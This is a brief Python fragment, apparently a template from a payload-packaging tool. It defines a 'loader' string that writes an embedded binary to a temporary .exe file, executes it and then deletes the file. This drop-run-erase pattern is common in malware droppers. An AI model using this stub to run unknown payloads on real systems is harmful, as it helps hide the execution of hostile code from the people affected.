loader="""
import subprocess
import os
import tempfile

fd, path = tempfile.mkstemp(suffix='.exe')

os.write(fd, self.payload)
os.close(fd)

try:
	result = subprocess.call(path)
finally:
	os.remove(path)

"""
